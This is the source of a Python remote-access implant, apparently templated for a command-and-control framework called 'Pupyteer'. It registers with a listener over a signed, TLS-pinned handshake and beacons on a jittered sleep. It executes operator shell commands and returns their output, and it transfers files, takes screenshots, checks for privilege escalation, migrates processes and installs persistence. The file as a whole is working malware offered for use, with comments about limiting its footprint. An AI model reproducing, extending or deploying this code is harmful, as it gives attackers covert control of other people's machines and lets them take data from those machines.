def _c2_roundtrip(transport) -> bool:
    """Register, then beacon on that session until the link breaks."""
    session_id, beacon = _register(transport)
    _log(f"registered as session {session_id}")
    _run_session(transport, session_id, beacon)
    return True

def _register(transport) -> tuple:
    """Register and return (session_id, beacon_token)."""
    ident = identity()
    resp = transport.request({
        "type": "register",
        "auth": AUTH_SECRET,
        "hostname": ident["hostname"],
        "os": ident["os"],
        "arch": ident["arch"],
        "username": ident["user"],
        "agent_version": ident["version"],
        # What this build was compiled with, written out of the same switches that
        # decided which handlers exist above. The server queues a tasking to an
        # implant that cannot perform it and gets whatever a shell says about the
        # word instead; this list is how it knows not to. It is a claim about this
        # file, not about what the operator is allowed to ask.
        "capabilities": [
            {% if include_exec %}"exec",{% endif %}
            "ping", "shutdown",
            {% if include_recon %}"sysinfo", "network", "processes", "netstat",{% endif %}

            {% if include_fs %}"fs_list", "fs_get", "fs_put",{% endif %}
            {% if include_privesc %}"privesc_check", "privesc_suggest",{% endif %}
            {% if include_screenshot %}"screenshot",{% endif %}
            {% if migration %}"migrate",{% endif %}
        ],
        # No fixed read buffer: a line here is as long as memory allows, and this
        # is the number a chunked transfer is sized against. It is generous on
        # purpose, because the transfer module caps at far less anyway.
        "max_line": 4 * 1024 * 1024,
    })
    if resp.get("type") == "error" and resp.get("message") == "auth_failed":
        # The listener is there and answered; it just does not know this agent.
        # Retrying cannot change that — the secret was fixed at build time — and
        # beaconing against a server that will never accept you is the loudest
        # possible footprint. Say it once and stop.
        _log("listener rejected our enrollment secret; rebuild this payload "
             "from the team server that owns the listener", "error")
        raise SystemExit(3)
    if resp.get("type") != "registered" or not resp.get("session_id"):
        raise TransportError(f"register refused: {resp!r}")
    # The token is what makes the next messages ours rather than merely addressed
    # to us. A server that withholds it is one we cannot beacon against, so treat
    # its absence as a failed registration rather than starting a session that the
    # listener will refuse every turn around.
    beacon = resp.get("beacon_token", "")
    if not beacon:
        raise TransportError("registered without a beacon token")
    return resp["session_id"], beacon

def _run_session(transport, session_id: str, beacon: str) -> None:
    """Check in, run what the server queues, report back, repeat.

    Returns only when the connection fails; main() then re-registers. The beacon
    token from registration travels on both message types, because a session id
    only names a session and anyone reading operator output can get one.
    """
    base_sleep = {{ cfg.sleep }}
    jitter_pct = {{ cfg.jitter }}
    while True:
        resp = transport.request({
            "type": "checkin",
            "session_id": session_id,
            "beacon": beacon,
        })
        if resp.get("type") == "error":
            raise TransportError(f"checkin refused: {resp.get('message')}")
        for task in resp.get("commands", []):
            result = _run_command(task.get("command", ""))
            transport.request({
                "type": "output",
                "session_id": session_id,
                "command_id": task.get("command_id", ""),
                "output": result,
                "beacon": beacon,
            })
        _jittered_sleep(base_sleep, jitter_pct)

def _run_command(text: str) -> str:
    """Run one line of operator input and return output as text.

    Anything that is not a named module action is executed as a shell command,
    which is what an operator typing into `sessions interact` expects.
    """
    text = (text or "").strip()
    if not text:
        return ""
    task = _parse_command(text)
    try:
        result = _dispatch(task)
    except SystemExit:
        raise
    except Exception as e:
        return f"error: {e}"
    if task.get("action") in ("fs_get", "fs_put", "screenshot"):
        # Binary replies carry base64 that the operator parses whole; clipping
        # it mid-stream yields corrupt data. They bound themselves instead.
        return _render_result(result)
    return _clip(_render_result(result))


def _render_result(result) -> str:
    if isinstance(result, dict) and "stdout" in result:
        out = result.get("stdout") or ""
        err = result.get("stderr") or ""
        rc = result.get("returncode")
        if err:
            out += err if out else ""
        if rc:
            out += f"\n[exit {rc}]"
        return out.strip() or f"[no output, exit {rc}]"
    if isinstance(result, str):
        return result
    try:
        return _j.dumps(result, default=str)
    except Exception:
        return str(result)


def _clip(text: str) -> str:
    """Keep one command from outgrowing the listener's message ceiling.

    A line over MAX_MESSAGE_BYTES kills the connection mid-transfer, taking
    every other session command down with it.
    """
    limit = {{ cfg.max_output }}
    if len(text) <= limit:
        return text
    return text[:limit] + f"\n[output truncated at {limit} chars]"


def _parse_command(text: str) -> dict:
    # A line that is already a JSON task bypasses the vocabulary: file transfer
    # needs arguments (offset, base64 data) that do not survive being typed.
    if text.startswith("{"):
        try:
            task = _j.loads(text)
        except ValueError:
            return {"action": "exec", "command": text}
        if isinstance(task, dict) and task.get("action"):
            return task
        return {"action": "exec", "command": text}
    verb, _, rest = text.partition(" ")
    v, arg = verb.lower(), text[len(verb):].strip()
    if v in ("sysinfo", "network", "netstat", "privesc_check", "privesc_suggest", "ping"):
        return {"action": v}
    if v in ("ps", "processes"):
        # Both words answer the server's capability by that name. A word the
        # queue will let through and this table does not know is a word that
        # reaches the shell, and the shell's complaint about it reads as the
        # target's answer.
        return {"action": "processes"}
    if v in ("exit", "shutdown"):
        return {"action": "shutdown"}
    if v == "fs_list":
        return {"action": "fs_list", "path": arg or "."}
    if v == "fs_get":
        parts = _sh.split(arg) if arg else []
        return {"action": "fs_get", "path": parts[0] if parts else "",
                "offset": int(parts[1]) if len(parts) > 1 else 0,
                "length": int(parts[2]) if len(parts) > 2 else 0}
    if v == "fs_put":
        # fs_put "<path>" <offset> <base64>
        parts = _sh.split(arg) if arg else []
        data = parts[-1] if parts else ""
        return {"action": "fs_put", "path": parts[0] if parts else "",
                "offset": int(parts[1]) if len(parts) > 2 else 0,
                "data": data}
    if v == "migrate":
        return {"action": "migrate", "target": arg}
    {% if include_screenshot %}
    if v == "screenshot":
        return {"action": "screenshot"}
    {% endif %}
    return {"action": "exec", "command": text}

# --------------------------------------------------------------------- #
#  Signed listener client (matches server AgentListener protocol)
# --------------------------------------------------------------------- #

class ListenerClient:
    """Line-JSON client for the authenticated Pupyteer TCP listener.

    Implements the Ed25519 challenge/response handshake:
      1. send {"type":"register", "agent_id", hostname, os, ...} (no sig)
      2. recv {"type":"challenge","nonce"}
      3. sign the nonce, re-send register with signature + nonce
      4. recv {"type":"registered","session_id"}
      5. loop: {"type":"checkin","session_id"} -> {"type":"commands",...}
         -> run each -> {"type":"output", session_id, command_id, output}
    """

    def __init__(self, host: str, port: int, timeout: int = 30):
        self._host = host
        self._port = port
        self._timeout = timeout
        self._sock = None
        self._fp = None
        self.session_id = ""
        # The listener issues this at register; every later checkin and report
        # must carry it or the listener refuses the message as not ours.
        self.beacon_token = ""

    def connect(self) -> bool:
        self._sock = _sk.create_connection((self._host, self._port), timeout=self._timeout)
        if TLS_ON:
            # Pin the listener to the certificate compiled into this build, the
            # same way the beacon transport does. A plaintext connect to a TLS
            # listener is a WRONG_VERSION_NUMBER handshake failure on the wire.
            ctx = pinned_tls_context()
            self._sock = ctx.wrap_socket(self._sock, server_hostname=self._host)
        self._fp = self._sock.makefile("rwb")
        return True

    def _send(self, obj: dict) -> None:
        self._fp.write((_j.dumps(obj) + "\n").encode())
        self._fp.flush()

    def _recv(self):
        line = self._fp.readline()
        if not line:
            raise TransportError("connection closed")
        return _j.loads(line.decode(errors="replace"))

    def register(self) -> bool:
        base = {
            "type": "register",
            "agent_id": _AGENT_ID,
            "hostname": HOSTNAME,
            "os": PLATFORM,
            "arch": ARCH,
            "username": USERNAME,
            "agent_version": __version__,
            # The listener gates tasking on what the implant declares, so the
            # register has to name its capabilities (same list the heavy build
            # declares in _register).
            "capabilities": list(CAPABILITIES),
            "max_line": 4 * 1024 * 1024,
        }
        if not _AGENT_ID:
            # Legacy unsigned listener: enroll with the shared secret. The
            # listener checks this at register (agent_auth on), so an agent
            # built without a signed identity still has to present it.
            base["auth"] = AUTH_SECRET
            self._send(base)
            resp = self._recv()
            if resp.get("type") == "registered":
                self.session_id = resp.get("session_id", "")
                self.beacon_token = resp.get("beacon_token", "")
                return True
            raise TransportError(f"register failed: {resp}")

        # Signed handshake: stage 1 (no sig) -> challenge.
        self._send(base)
        resp = self._recv()
        if resp.get("type") != "challenge":
            raise TransportError(f"expected challenge, got: {resp}")
        nonce = resp.get("nonce", "")
        # Stage 2: sign the nonce. Both the nonce and the signature are
        # short-lived secrets — scrub them as soon as they are on the wire.
        sig = _sign(nonce)
        base["nonce"] = nonce
        base["signature"] = sig
        self._send(base)
        sig_buf = _scrub_str(sig)
        nonce_buf = _scrub_str(nonce)
        _scrub(sig_buf, nonce_buf)
        base.pop("nonce", None)
        base.pop("signature", None)
        resp = self._recv()
        if resp.get("type") != "registered":
            raise TransportError(f"registration rejected: {resp}")
        self.session_id = resp.get("session_id", "")
        self.beacon_token = resp.get("beacon_token", "")
        return True

    def checkin(self) -> list:
        self._send({"type": "checkin", "session_id": self.session_id,
                    "beacon": self.beacon_token})
        resp = self._recv()
        if resp.get("type") == "commands":
            return resp.get("commands", [])
        return []

    def report(self, command_id: str, output: str) -> None:
        self._send({
            "type": "output",
            "session_id": self.session_id,
            "command_id": command_id,
            "output": output,
            "beacon": self.beacon_token,
        })

    def close(self) -> None:
        try:
            if self._fp:
                self._fp.close()
            if self._sock:
                self._sock.close()
        except Exception:
            pass


def _listener_loop() -> None:
    """Full authenticated session against the TCP listener."""
    host = "{{ cfg.host }}"
    port = {{ cfg.port }}
    client = ListenerClient(host, port)
    # (Re)connect + register, retrying on a refused or lost link. An agent that
    # exits the first time the listener is not up yet is worthless as a C2 — the
    # listener routinely starts after the payload, and restarts under it. But a
    # registration the listener *rejects* (wrong/absent enrollment secret) is
    # not transient: retrying it forever is bad egress, not persistence, so it
    # stops with the same exit code the beacon loop uses.
    def _attach() -> ListenerClient:
        while True:
            try:
                c = ListenerClient(host, port)
                c.connect()
                c.register()
                return c
            except TransportError as e:
                if "auth_failed" in str(e):
                    _log("listener rejected our enrollment secret; rebuild this "
                         "payload from the team server that owns the listener",
                         "error")
                    raise SystemExit(3)
                _log(f"listener rejected us ({e}); retrying", "debug")
                _t.sleep(5)
            except OSError as e:
                _log(f"listener unreachable ({e}); retrying", "debug")
                _t.sleep(5)
    client = _attach()
    _log(f"registered with listener as session {client.session_id}")
    while True:
        try:
            cmds = client.checkin()
            for c in cmds:
                # Parse the operator's command line the same way the beacon
                # loop does: _run_command splits "fs_list /path" into the action
                # and its args before dispatch. Sending the raw string as the
                # action makes every parameterised command an "unknown action".
                out = _run_command(c.get("command", ""))
                client.report(c.get("command_id", ""), out)
                _scrub(_scrub_str(out))
                out = ""
        except (TransportError, OSError) as e:
            _log(f"listener loop error: {e}; reconnecting", "debug")
            _t.sleep(5)
            try:
                client.close()
            except Exception:
                pass
            client = _attach()
        _jittered_sleep({{ cfg.sleep }}, {{ cfg.jitter }})

# --------------------------------------------------------------------- #
#  Main entry point
# --------------------------------------------------------------------- #

def main():
    _log(f"starting agent {AGENT_ID} on {PLATFORM}/{ARCH}")
    if TLS_ON and not TLS_CERT_PEM:
        # Not a transient failure to wait out: without a certificate to trust the
        # agent can never reach its listener, and a silent retry loop hides the
        # build mistake that caused it.
        _log("TLS enabled with no listener certificate compiled in; exiting", "error")
        raise SystemExit(2)
    {% if persistence %}
    try:
        install_persistence()
    except Exception as e:
        _log(f"persistence error: {e}", "debug")
    {% endif %}
    {% if relay %}
    try:
        start_relay()
    except Exception as e:
        _log(f"relay error: {e}", "debug")
    {% endif %}
    base_sleep = {{ cfg.sleep }}
    jitter_pct = {{ cfg.jitter }}
    transport_name = "{{ transport }}"
    # TCP transport talks to the authenticated AgentListener; use the signed
    # listener client for it. Other transports keep the classic beacon loop.
    if transport_name == "tcp":
        try:
            _listener_loop()
        except KeyboardInterrupt:
            _log("interrupted", "debug")
        return
    transport = make_transport()
    failures = 0
    while True:
        transport = make_transport()
        try:
            _c2_roundtrip(transport)
            failures = 0
        except Exception as e:
            failures += 1
            # The first failure is the one that answers "why is this beacon not
            # coming home". After that keep quiet: repeating it is a footprint.
            _log(f"link lost: {e}", "info" if failures == 1 else "debug")
            transport.close()
            _jittered_sleep({{ cfg.sleep }}, {{ cfg.jitter }})

if __name__ == "__main__":
    # Support --child-migrated so forked children skip persistence + relay bootstrap.
    if "--child-migrated" in _sy.argv:
        pass
    main()
'''
